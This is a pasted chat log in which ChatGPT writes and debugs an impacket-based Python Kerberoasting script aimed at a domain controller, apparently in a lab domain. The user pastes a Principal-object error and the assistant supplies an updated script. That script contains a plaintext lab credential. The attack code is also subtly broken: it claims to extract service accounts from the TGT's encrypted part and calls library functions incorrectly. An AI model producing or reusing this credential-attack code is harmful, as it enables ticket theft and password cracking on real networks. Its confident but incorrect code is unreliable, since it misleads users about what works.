from impacket.smbconnection import SMBConnection
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal

def kerberoast(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Get TGT ticket for the specified user
        krbtgt_ticket = getKerberosTGT(username, domain, dc_ip, None, None)
        if krbtgt_ticket:
            print("Successfully obtained krbtgt ticket.")
            
            # Extract usernames of kerberoastable accounts from the TGT
            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
                    # Kerberoast each account
                    tgs_rep = getKerberosTGS(krbtgt_ticket, str(Principal(account, type=Principal.NT_PRINCIPAL)))
                    print(f"TGS_REP for {account}:")
                    print(tgs_rep.native)
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def extract_kerberoastable_accounts(tgt):
    try:
        kerberoastable_accounts = []

        for ticket in tgt['enc-part']['cipher'].tickets:
            sname = str(ticket['sname'])
            if sname.startswith('service'):
                service_name = sname.split('/')[1].split('@')[0]
                kerberoastable_accounts.append(service_name)

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while extracting kerberoastable accounts: {e}")
        return []

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "your_username"
password = "your_password"
domain = "your_domain"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)
Let me know if this resolves the issue!



User
That worked, but new error: Error while Kerberoasting: 'str' object has no attribute 'components_to_asn1'
ChatGPT
It seems we encountered an error while trying to generate the TGS-REP (Ticket Granting Service Reply) for a kerberoastable account. This error suggests that there might be an issue with how we're handling the Principal object when calling the getKerberosTGS function.

Let's ensure that the Principal object is constructed correctly before passing it to the getKerberosTGS function. Here's the updated code:

python
Copy code
from impacket.smbconnection import SMBConnection
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal

def kerberoast(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Get TGT ticket for the specified user
        krbtgt_ticket = getKerberosTGT(username, domain, dc_ip, None, None)
        if krbtgt_ticket:
            print("Successfully obtained krbtgt ticket.")
            
            # Extract usernames of kerberoastable accounts from the TGT
            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
                    # Kerberoast each account
                    principal = Principal(account, type=Principal.NT_PRINCIPAL)
                    tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
                    print(f"TGS_REP for {account}:")
                    print(tgs_rep.native)
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def extract_kerberoastable_accounts(tgt):
    try:
        kerberoastable_accounts = []

        for ticket in tgt['enc-part']['cipher'].tickets:
            sname = str(ticket['sname'])
            if sname.startswith('service'):
                service_name = sname.split('/')[1].split('@')[0]
                kerberoastable_accounts.append(service_name)

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while extracting kerberoastable accounts: {e}")
        return []

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)